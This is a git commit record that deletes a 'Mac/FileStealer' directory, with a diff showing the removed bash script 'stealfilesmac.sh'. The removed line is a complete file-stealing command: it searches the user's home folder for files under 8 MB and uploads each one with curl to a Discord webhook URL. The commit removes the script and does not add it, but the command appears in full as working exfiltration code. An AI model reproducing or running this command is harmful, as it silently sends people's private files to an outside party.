3e138b93669f3002ebddcd5e9eac8eb43d433baa
b4dact0r <rich@murrills.com>
2025-02-18 19:50:02 +0000

    Delete Mac/FileStealer directory

--- Mac/FileStealer/stealfilesmac.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-find ~/ -type f -name "*.*" -size -8M -maxdepth 3 -exec curl -s -F "file=@{}" "https://discordapp.com/api/webhooks/insertID here/70V-bamgLp3zHqtGCngWbwYc7m2ZiWLf4Km8i6az2fQIwV2_wd55eN7qhyQkbi01dAEP" \;
